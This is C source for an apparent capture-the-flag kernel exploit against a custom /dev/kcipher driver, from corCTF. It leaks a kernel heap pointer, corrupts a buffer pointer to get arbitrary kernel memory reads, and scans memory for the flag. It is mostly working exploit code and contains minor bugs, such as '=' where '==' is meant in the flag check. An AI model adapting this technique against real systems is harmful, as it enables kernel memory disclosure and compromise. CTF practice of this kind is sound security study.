#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <errno.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/timerfd.h>
#include <sys/ioctl.h>


#define DEV_PATH "/dev/kcipher"   // the path the device is placed

#define ulong unsigned long
#define PAGE_SZ 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define ARRAY_SIZE(a) (sizeof((a)) / sizeof((a)[0]))
#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }
static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

#define CMD_ALLOC 0x13370000
#define CMD_FLIP  0x13370001

static void alloc(int fd, unsigned long sz)
{
    int off = 0x0;
    if (ioctl(fd, CMD_ALLOC, sz) < 0) {
        errExit("ioctl");
    }
}

static void flip(int fd, int off)
{
    if (ioctl(fd, CMD_FLIP, off) < 0) {
        errExit("ioctl");
    }
}

static int get_cipher_fd(int fd, uint64_t cipher_num, bool ok_fail) {
    int _fd = ioctl(fd, 0xedbeef00, &cipher_num);
    if (_fd < 0 && !ok_fail) {
        errExit("get_cipher_fd");
    }

    return _fd;
}

#define CRYPTO_ROT 0
#define CRYPTO_XOR 1
#define CRYPTO_ALZ26 2
#define CRYPTO_ATBASH 3

int main(int argc, char** argv)
{
    int fd;
    int ret;

    fd = open(DEV_PATH, O_RDONLY);

    if (fd < 0) {
        errExit("open");
    }

    char buf[0x1000];
    read(fd, buf, 0x100);

    printf("Buf: %s \n", buf);
    print_hex8(buf, 0x100);

    uint64_t crypto_op = CRYPTO_XOR;
    uint64_t crypto_arg = 0x0;

    memset(buf, 0x41, sizeof(buf));
    int fd2 = get_cipher_fd(fd, crypto_arg << 32 | crypto_op, false);
    get_cipher_fd(fd, 0xdeadbeef, true);
    int fd3 = 5;

    write(fd3, buf, 0x8);

    memset(buf, 0x0, sizeof(buf));
    memset(buf, 'A', 0xf);

    ret = write(fd2, buf, 0x60);
    read(fd2, buf, 0x38);

    print_hex8(buf, 0x40);

    uint64_t* p_buf = (uint64_t*)buf;
    uint64_t heap_leak = p_buf[0x2];
    info("heap_leak: %p \n", heap_leak);

    uint64_t read_addr = heap_leak - 0xa00000;

    memset(buf, 0x42, 0x10);
    p_buf[2] = heap_leak;
    p_buf[2] = read_addr;
    ret = write(fd2, buf, 0x60);

    info("reading from : %p \n", read_addr);

    while(true) {
        memset(buf, 0x42, 0x10);
        p_buf[2] = read_addr;
        ret = write(fd2, buf, 0x60);

        ret = read(fd3, buf, sizeof(buf));
        for (int i = 0; i < sizeof(buf); i++) {
            if (buf[i] = 0x63 && buf[i+1] == 0x6f && buf[i+2] == 0x72 && buf[i+3] == 0x63
                && buf[i+4] == 0x74) {
                char* flag = &buf[i];
                info("flag found :) %s ", flag);
                print_hex8(&buf[i], 0x20);
                return 0;
            }
        }
        read_addr += sizeof(buf);
    }

    info("flag not found :( \n");

    WAIT();
}

// https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-39793.html
// corctf{b4s3d_0n_CVE-2022-28350}

